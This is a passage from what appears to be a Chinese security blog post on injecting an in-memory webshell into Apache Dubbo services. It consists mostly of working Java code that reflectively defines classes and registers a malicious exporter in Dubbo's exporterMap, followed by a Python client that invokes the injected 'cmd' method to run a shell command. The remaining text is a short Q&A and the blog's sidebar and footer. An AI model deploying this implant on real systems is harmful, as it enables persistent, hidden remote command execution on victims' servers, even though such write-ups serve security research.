Integer(extServiceBytes.length)&#125;);</span><br><span class="line">            Class extServiceImplClazz = (Class) defineClassMethod.invoke(proxyClassLoader, <span class="keyword">new</span> Object[]&#123;extServiceImplBytes, <span class="keyword">new</span> Integer(<span class="number">0</span>), <span class="keyword">new</span> Integer(extServiceImplBytes.length)&#125;);</span><br><span class="line"></span><br><span class="line">            Invoker&lt;?&gt; invoker = proxyFactoryObj.getInvoker(extServiceImplClazz.newInstance(), extServiceClazz, dubboURL);</span><br><span class="line"></span><br><span class="line">            URL url = invoker.getUrl();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// export service. org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol.export</span></span><br><span class="line">            <span class="comment">// dubboProtocol#export方法中将暴露接口和启动服务写在同一个函数，没预想到动态加载接口，所以这里不直接调用export而是抽取部分export代码反射修改exporterMap添加恶意对象映射关系</span></span><br><span class="line">            Field exporterMapField = protocolObj.getClass().getSuperclass().getDeclaredField(<span class="string">"exporterMap"</span>);</span><br><span class="line">            exporterMapField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Map&lt;String, Exporter&lt;?&gt;&gt; exporterMap = (Map&lt;String, Exporter&lt;?&gt;&gt;) exporterMapField.get(protocolObj);</span><br><span class="line"></span><br><span class="line">            Method serviceKeyMethod = protocolObj.getClass().getSuperclass().getDeclaredMethod(<span class="string">"serviceKey"</span>, URL<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            serviceKeyMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            String key = (String) serviceKeyMethod.invoke(protocolObj, url);</span><br><span class="line"></span><br><span class="line">            DubboExporter exporter = <span class="keyword">new</span> DubboExporter(invoker, key, exporterMap);</span><br><span class="line">            exporterMap.put(key, exporter);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2021/10/20211005141515036_2088009975.png" alt></p>
+<p>客户端调用即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> dubbo.codec.hessian2 <span class="keyword">import</span> new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"><span class="keyword">from</span> dubbo.java_class <span class="keyword">import</span> JavaString</span><br><span class="line"></span><br><span class="line">client = DubboClient(<span class="string">'127.0.0.1'</span>, <span class="number">20880</span>)</span><br><span class="line"><span class="comment"># 构造一个Java Object为com.demo.test的参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">'x.extendService'</span>,service_version=<span class="string">""</span>,</span><br><span class="line">    method_name=<span class="string">'cmd'</span>,</span><br><span class="line">    args=[JavaString(<span class="string">"open -na calculator"</span>)])</span><br><span class="line"></span><br><span class="line">print(resp)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/2021/10/20211005142118889_1153374198.png" alt></p>
+<h2 id="部分疑问"><a href="#部分疑问" class="headerlink" title="部分疑问"></a>部分疑问</h2><ol>
+<li>http over hessian内存马，为啥不直接注入jetty filter或者servlet马？<br>目前使用网上jetty内存马无法在dubbo中找到org.eclipse.jetty.webapp:type=webappcontext对象</li>
+</ol>
+<hr>
+<p>随便写写，抛砖引玉，如有错误请联系。</p>
+
+</div>
+  
+    <div class="copyright">
+    <p>如无特殊说明，均为原创内容。转载请注明出处！</p>
+</div>
+  
+    
+  
+    
+  <nav aria-label="pager" class="nav-pager">
+    <ul class="pager">
+      
+      
+        <li class="next"><a href="/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/Multiple%20vulnerabilities%20in%20pgadmin4/">Multiple vulnerabilities in pgadmin &lt;= 4.25 <span aria-hidden="true">&rarr;</span></a></li>
+      
+    </ul>
+  </nav>
+
+  
+    
+    
+
+  
+</article></section>
+      <aside class="col-md-3 sidebar">
+
+  <!--<div id="widget-search" class="widget widget-search">-->
+  <!--<div class="widget-content">-->
+    <!--<form class="form-inline" id="widget-search-form" onsubmit="return false;">-->
+      <!--<div class="form-group">-->
+        <!--<input type="text" class="form-control" id="widget-search-keyword" placeholder="" autocomplete="off" autofocus>-->
+      <!--</div>-->
+      <!--<div class="form-group">-->
+        <!--<button type="submit" class="btn btn-default">搜索</button>-->
+      <!--</div>-->
+    <!--</form>-->
+    <!--<div class="modal fade widget-search-results" id="widget-search-results" tabindex="-1" role="dialog" aria-labelledby="widget-search-results">-->
+      <!--<div class="modal-dialog" role="document">-->
+        <!--<div class="modal-content">-->
+          <!--<div class="modal-body"></div>-->
+        <!--</div>-->
+      <!--</div>-->
+    <!--</div>-->
+  <!--</div>-->
+<!--</div>-->
+
+  <div id="widget-toc" class="widget widget-toc">
+  <h3 class="widget-title">目录</h3>
+  <div class="widget-content">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞测试环境："><span class="toc-number">1.</span> <span class="toc-text">漏洞测试环境：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码环境："><span class="toc-number">2.</span> <span class="toc-text">代码环境：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内存马前置知识"><span class="toc-number">3.</span> <span class="toc-text">内存马前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dubbo-SPI"><span class="toc-number">3.1.</span> <span class="toc-text">dubbo SPI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#扩展加载器特点："><span class="toc-number">3.1.1.</span> <span class="toc-text">扩展加载器特点：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内存马注入"><span class="toc-number">4.</span> <span class="toc-text">内存马注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dubbo原生协议注入内存马"><span class="toc-number">5.</span> <span class="toc-text">dubbo原生协议注入内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#部分疑问"><span class="toc-number">6.</span> <span class="toc-text">部分疑问</span></a></li></ol>
+  </div>
+</div>
+
+  <div class="widget">
+    <h3 class="widget-title">友情链接</h3>
+    <ul>
+        <li><a href="http://blog.happysec.cn" title target="_blank" rel="external nofollow noopener noreferrer">depy</a></li>
+        <li><a href="https://www.hedysx.com" title target="_blank" rel="external nofollow noopener noreferrer">hedysx</a></li>
+        <li><a href="https://www.3cac.com" title target="_blank" rel="external nofollow noopener noreferrer">卡</a></li>
+        <li><a href="http://blog.he4rt.me" title target="_blank" rel="external nofollow noopener noreferrer">he4rt</a></li>
+        <li><a href="https://sec.mrfan.xyz" title target="_blank" rel="external nofollow noopener noreferrer">饭先生</a></li>
+        <li><a href="https://www.waitalone.cn" title target="_blank" rel="external nofollow noopener noreferrer">独自等待</a></li>
+        <li><a href="https://www.ch1ng.com" title target="_blank" rel="external nofollow noopener noreferrer">金枪银矛小霸王</a></li>
+        <li><a href="https://www.scanfsec.com" title target="_blank" rel="external nofollow noopener noreferrer">scanf</a></li>
+    </ul>
+</div>
+</aside>
+      <div class="tools"><a href="javascript: void(0)" class="go-to-top" style="display: none;"><i class="fa fa-chevron-circle-up"></i></a></div>
+    </div>
+    <footer id="footer" class="footer">
+  <p>Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. 勿忘初心.</p>
+  
+    <!-- Highlight.js -->
+    <link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+    <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js">
+    </script>
+    <script>
+      hljs.initHighlightingOnLoad();
+
+    </script>
+  
+</footer>
+  </div>
+  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+<!--<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>-->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Include all compiled plugins (below), or include individual files as needed -->
+<!--<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>-->
+<!-- main scripts -->
+
+<script src="/js/main.js"></script>
+
+<!-- seo -->
+<script>
+
+</script>
+<!-- statistics -->
+<div class="hidden">
+  
+  
+  
+  
+  
+</div>
+</body>
+</html>
